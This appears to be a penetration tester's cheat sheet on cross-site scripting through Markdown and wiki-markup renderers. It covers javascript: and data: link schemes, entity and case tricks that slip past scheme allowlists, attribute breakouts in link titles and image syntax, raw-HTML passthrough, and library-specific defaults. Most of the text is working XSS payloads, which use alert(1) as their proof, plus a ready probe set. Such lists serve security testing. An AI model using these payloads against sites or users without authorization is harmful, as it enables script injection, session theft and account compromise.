# Markdown / renderer XSS — the link and raw-HTML paths

Markdown renderers take `**text**` → `<strong>text</strong>` — the
dangerous surfaces are link hrefs (scheme-checked or not), raw-HTML
passthrough, and renderer-specific quirks.

---

## 1. The link-scheme attack — `](javascript:...)`

```markdown
[click](javascript:alert(1))
[click](jAvAsCrIpT:alert(1))
[click](java&Tab;script:alert(1))
[click](&#106;avascript:alert(1))
[click](javascript&colon;alert(1))
[click](javascript&#58;alert(1))
[click](data:text/html,<script>alert(1)</script>)
[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
[click](vbscript:msgbox(1))
```

`marked`, `markdown-it`, `showdown`, `remark` handle these
differently — most check a scheme allowlist (`http:`, `https:`,
`mailto:`). The bypasses are entity-encodings and case-tricks that
the SCHEME-PARSER accepts but the allowlist-matcher misses.

---

## 2. The attribute-breakout inside the link syntax

```markdown
[click](x"onmouseover="alert(1))
[click](x onmouseover="alert(1))
[click](x)"onmouseover="alert(1)
```

The `title` slot: `[x](url "title")` — a `"` inside the title can
escape into raw attr:

```markdown
[x](url "onmouseover=alert(1) x=")
   → <a href="url" title="onmouseover=alert(1) x=">x</a>
[x](url "x"onmouseover=alert(1))
   → <a href="url" title="x"onmouseover=alert(1)>x</a>
[x](url 'onmouseover=alert(1) x=')   -- single-quoted title slot
```

---

## 3. Raw HTML passthrough — the biggest hole

Most renderers pass raw HTML through unchanged:

```markdown
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<a href=javascript:alert(1)>x</a>
<script>alert(1)</script>
```

If ANY html tag renders — the whole tag space is open. The
renderer-option `sanitize`/`safe`/`html:false` is what disables it —
check the render config.

---

## 4. The autolink variants

```markdown
<javascript:alert(1)>            -- autolink syntax
<data:text/html,...>
javascript:alert(1)               -- bare URL — if autolinked
www.javascript:alert(1).com       -- www-prefix autolink → domain!
```

Autolinked URLs go through the same href-scheme check.

---

## 5. Image links — `![alt](src)`

```markdown
![x](javascript:alert(1))           -- dead — img loads it as image
![x](data:image/svg+xml,<svg...>)   -- dead — img-loaded svg no exec
![x](x"onerror="alert(1))            -- attr escape inside img
![x"onerror="alert(1)](x)            -- attr escape via alt
```

img-src can't run javascript: — but the attr-escape inside the
markdown-img syntax can add onerror to the rendered img tag.

---

## 6. Reference-style links

```markdown
[a]: javascript:alert(1)
[click][a]
   -- same href path — the scheme check applies to the def line

[a]: x "onmouseover=alert(1)
[click][a]
   -- title-slot escape
```

---

## 7. Nested/markdown-in-html

```markdown
<div markdown="1">
**x** <img src=x onerror=alert(1)>
</div>
   -- markdown-in-html — the inner markdown STILL renders +
      raw tags still pass through
```

`markdown="1"`/`markdown="block"` enables markdown inside HTML —
a markdown filter that allows the attr can get tags inside it.

---

## 8. The renderer-specific quirks

```text
marked:       - sanitize option removed in v4 — the renderer is
              RAW by default; app must sanitize separately
              - smartypants/pedantic options change escape rules
markdown-it:  - html:true enables raw html (default false)
              - linkify autolinks bare urls — scheme check
showdown:     - raw html always passes (no sanitize option)
remark/rehype:- rehype-raw opt-in — usually off by default
commonmark:   - reference impl — raw html passes in most impls
blackfriday:  - go — raw html default
redcarpet:    - ruby — :filter_html option
```

The "sanitize separately" pattern — the app renders markdown then
runs DOMPurify — the mXSS paths in `mutation-xss.md` apply.

---

## 9. The double-render bug

```text
input → markdown render → sanitize → display
       ↓
input → markdown render → display   (sanitize skipped on edit-view)
```

If the app renders markdown in TWO places (a preview AND a final
view) and only sanitizes one — the unsanitized render is the XSS.
Test both paths.

---

## 10. The wiki/renderer siblings — not just markdown

```text
BBCode: [url=javascript:alert(1)]x[/url]  [img]x[/img] onerror via
        [url=x][img]x[/img][/url] nesting, [color] CSS injection
AsciiDoc: link:javascript:alert(1)[x]
Textile: "x":javascript:alert(1)
reStructuredText: `x <javascript:alert(1)>`_
MediaWiki: [javascript:alert(1) x]  {{#if:...}} parser functions
           [http://x.com "onmouseover="alert(1)]
```

Each wiki markup has its own link/attr syntax — the same scheme-
check+attr-escape pattern applies.

---

## 11. The detection probe set

```markdown
[b](javascript:alert(1))
[b](data:text/html,<script>alert(1)</script>)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
[b](x"onmouseover="alert(1))
[b](x)"onmouseover="alert(1)
**x**<img src=x onerror=alert(1)>**y**
```

The first confirms the scheme-check; the next two confirm raw-HTML;
the attr-escapes confirm the link-title path; the last is the
markdown+html mix.
